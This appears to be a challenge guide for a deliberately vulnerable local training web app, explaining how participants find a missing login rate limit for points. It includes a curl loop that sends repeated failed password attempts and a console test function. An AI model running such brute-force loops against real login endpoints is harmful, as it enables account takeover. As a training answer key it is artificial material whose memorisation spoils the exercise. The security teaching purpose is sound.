# No Rate Limiting on Login - Vulnerability Guide

## Overview
This vulnerability allows unlimited password attempts on the login endpoint without any rate limiting, account lockouts, or CAPTCHA protection.

## Bug Details
- **Vulnerability Type**: No Rate Limiting  
- **Severity**: Medium
- **Points**: 85
- **Location**: Login endpoint `/api/auth/login/`

## How to Discover (Participant Steps)

### Method 1: Manual Testing
1. Go to the login page: http://localhost:8084/login
2. Enter a valid email (e.g., `admin@shopfluence.com` or `user@shopfluence.com`)
3. Enter an **incorrect password** (e.g., `wrongpassword123`)
4. Submit the login form repeatedly (10+ times)
5. Notice:
   - No rate limiting occurs
   - No account lockout happens
   - No CAPTCHA appears
   - No delays are introduced
   - Unlimited attempts are allowed

### Method 2: Browser Console Commands
1. Go to http://localhost:8084
2. Open Developer Tools (F12)
3. Go to Console tab
4. Run the test function:
```javascript
// Test rate limiting vulnerability automatically
await window.testRateLimiting()
```

### Expected Output:
```
🔄 Testing login rate limiting vulnerability...
📧 Using test credentials - username: testuser@example.com, wrong password: wrongpassword123
🎯 Attempting 12 failed login attempts...
🔄 Attempt 1/12...
❌ Failed attempt 1: Login failed
🔄 Attempt 2/12...
❌ Failed attempt 2: Login failed
...
📊 Total failed attempts: 12
🎯 Recording rate limiting vulnerability...
🎉 SUCCESS! Login rate limiting vulnerability detected!
💥 Failed attempts: 12
📝 Description: Login endpoint allows unlimited password attempts without rate limiting or account lockout
🏆 Points earned: 85

🔍 Vulnerability Details:
• Login endpoint accepts unlimited password attempts
• No rate limiting or account lockout mechanism
• Allows brute force attacks on user accounts
• No CAPTCHA or delay after failed attempts
```

## Technical Details

### Vulnerable Endpoint
- **URL**: `POST /api/auth/login/`
- **Issue**: No rate limiting implementation
- **Risk**: Brute force attacks possible

### What Should Be Protected
Real applications should implement:
- Rate limiting (e.g., max 5 attempts per 15 minutes)
- Account lockout after failed attempts
- CAPTCHA after multiple failures
- IP-based rate limiting
- Progressive delays between attempts

### Bug Detection Logic
The backend detects this vulnerability when:
1. 10 or more failed login attempts are recorded
2. No rate limiting blocks the attempts
3. All attempts come from the same source

## Proof of Concept Script

You can also test manually with curl:

```bash
# Test multiple failed login attempts
for i in {1..12}; do
  echo "Attempt $i:"
  curl -X POST http://localhost:8000/api/auth/login/ \
    -H "Content-Type: application/json" \
    -d '{"email": "testuser@example.com", "password": "wrongpassword'$i'"}' \
    -w "Status: %{http_code}\n"
  echo "---"
  sleep 0.1
done

# Record the bug after 10+ attempts
curl -X POST http://localhost:8000/api/bugs/rate-limiting/ \
  -H "Content-Type: application/json" \
  -d '{"attempt_count": 12, "email": "testuser@example.com"}'
```

## Impact
- **Brute Force Attacks**: Attackers can attempt unlimited passwords
- **Account Compromise**: Valid accounts can be compromised through password guessing
- **Resource Exhaustion**: High volume of requests can impact server performance
- **User Account Security**: No protection against automated attacks

## Successful Discovery Indicators
✅ Backend returns NO_RATE_LIMITING bug notification  
✅ Points are awarded (85 points)  
✅ Notification appears in the UI  
✅ Console shows detailed vulnerability information  
✅ Leaderboard is updated with the discovery  

## Real-World Scenario
This type of vulnerability is common in applications that don't implement proper authentication controls. Attackers often use automated tools to perform brute force attacks against login endpoints.
